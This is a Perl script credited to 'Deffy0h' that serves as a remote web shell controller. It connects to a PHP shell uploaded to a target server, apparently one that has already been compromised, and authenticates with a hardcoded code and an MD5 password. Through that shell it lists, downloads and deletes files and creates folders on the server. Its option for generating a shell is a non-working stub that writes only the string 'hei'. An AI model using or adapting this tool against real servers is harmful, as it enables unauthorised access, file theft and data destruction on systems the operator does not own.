#Skype: Deffy0h

use HTTP::Request;
use LWP::UserAgent;
use Getopt::Long;
use Digest::MD5 qw(md5_hex);

$deffy0h="Deffy0h";
$code="Deffy0h-CODE:a0b91d8e06136094e4e9f2633d219324";
my $OK_HTTP=200;
my $RE_ERRO="ERRO0";

print <<Eop;




		88d888b. 88d8b.d8b. dP    dP .d8888b.
		88'  `88 88'`88'`88 88    88 88'  `""
		88    88 88  88  88 88.  .88 88.  ...
		dP    dP dP  dP  dP `88888P' `88888P'
		
		
		-===================================-
		\t  Create By $deffy0h
		-===================================-

		
		
		use: nmuc.pl -op 'CONN' -connect to shell
		use: nmuc.pl -op 'CREN' -generate shell
		
Eop

my $u="";
my $p="";
my $op="";
my $auth="";
my $path="";
my $lastFolder="";
my $lj="";

GetOptions("opt=s"=>\$op);

unless($op){
print "\n[-] OPTION\n\n";
exit;
}

if($op eq "CONN"){
CONN();
}
if($op eq "CREN"){
CREN();
}

sub CREN(){
my $file="Shell.php";
my $strCODE="hei";
print "FILE: ";
$file=<STDIN>;
if($file!~m/.php$/){
$file="Shell.php";
}

open($a,">",$file) or die("[-] ERRO\n");

print "PASSWORD: ";
$p=<STDIN>;
unless($p){
print "[-] PASSWORD=''\n";
exit;
}

$p=md5_hex($p);

print "[+] FILE=> $file\n";
print "[+] PASSWORD=> $p\n";

$a->print($strCODE);
$a->close();

print "[+] FILE $file SAVED\n\n";

}

sub CONN(){
print "URL: target.com/upload/file/shell.php\n";
print "URL: ";
$u=<STDIN>;
chomp($u);
unless($u){
print "\n[-] NOT DEFINED URL\n";
exit;
}

if($u!~m/http:/){
$u="http://".$u;
}

$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$u)){
$response=$ua->request($re);
if($response->status_line!=$OK_HTTP){
print "\n[-] ERRO\n";
exit;
}
}

print "PASSWORD: ";
$p=<STDIN>;
chomp($p);
unless($p){
print "\n[-] NOT DEFINED PASSWORD\n";
exit;
}

$p=md5_hex($p);

print "\n\n";
print "[+] URL=> $u\n";
print "[+] PASSWORD=> $p\n";

if($u!~m/[?]/){
$u=$u."?";
}

my $ioe="code=".$code."&p=".$p;
$auth=$u.$ioe;

print "[+] AUTHENTICATING...\n";

if($re=HTTP::Request->new(GET=>$auth)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "[+] OK WELCOME\n";
}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}

COMMAND();
}

sub RETN(){
COMMAND();
}

sub COMMAND(){
print "COMMAND: ";
my $command=<STDIN>;
chomp($command); 

if($command eq "dir"){
FILES_SERVER();
}
if($command eq "cls"){
CLS();
}
if($command eq "exit"){
EX();
}
if($command eq "open"){
OPEN_FILES();
}
if($command eq "mkdir"){
CREATE_FOLDER();
}
if($command eq "del"){
DEL_();
}
if($command ne "dir" || $command ne "cls" || $command ne "exit" || $command ne "open" || $command ne "mkdir" || $command ne "del"){RETN();}

}

sub DEL_(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

$delmk=$auth."&type=del&path=".$path;

if($re=HTTP::Request->new(GET=>$delmk)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "\n";


print "\n[+] $path DELETED\n";


}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub FILES_SERVER(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

if($path!~m/./){
$path="/".$path."/";
}

$u_files=$auth."&type=files"."&path=".$path;

if($re=HTTP::Request->new(GET=>$u_files)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
if($htm=~/Array/){
print "\n";

$lastFolder=$lastFolder."/".$path;
$lj=$path;

print "[+] PATH=> ".$lastFolder."\n\n";
print $htm;
}else{
print "USE: /folder/ or '/' or '../folder/' or '.'\n";
}
}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub OPEN_FILES(){

print "FILE=> ";
$path=<STDIN>;
chomp($path);

print "SAVE=> ";
my $save="";
$save=<STDIN>;
chomp($save);
unless($save){
$save="index.php";
}

$uu_files=$auth."&type=open&path=".$path;

if($re=HTTP::Request->new(GET=>$uu_files)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "\n";

if($htm!~m/EEE_FD/){

open($a,">",$save);
$a->print($htm);
$a->close();

print "\n[+] FILE $save SAVE\n";

}else{
print "\n[-] FILE NOT EXISTS\n";
}

}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub CREATE_FOLDER(){

print "PATH=> ";
$path=<STDIN>;
chomp($path);

print "FOLDER=> ";
my $folder="";
$folder=<STDIN>;
chomp($folder);

$uumk_=$auth."&type=mkdir&path=".$path."/".$folder;

if($re=HTTP::Request->new(GET=>$uumk_)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
$htm=$response->decoded_content;
if($htm!~m/$RE_ERRO/){
print "\n";


print "\n[+] FOLDER $folder CREATED\n";


}else{
print "[-] INCORRECT PASSWORD\n";
exit;
}
}else{
print "\n[-] ERRO\n";
exit;
}
}
print "\n\n";
RETN();
}

sub CLS(){
system("cls");
RETN();
}

sub EX(){exit;}

__END__

Deffy0h   Channel Youtube
https://www.youtube.com/channel/UC9kMfNPD3dgMO94JeFdTVBA
http://deffy0h.tk

BANNER:
http://www.kammerl.de/ascii/AsciiSignature.php
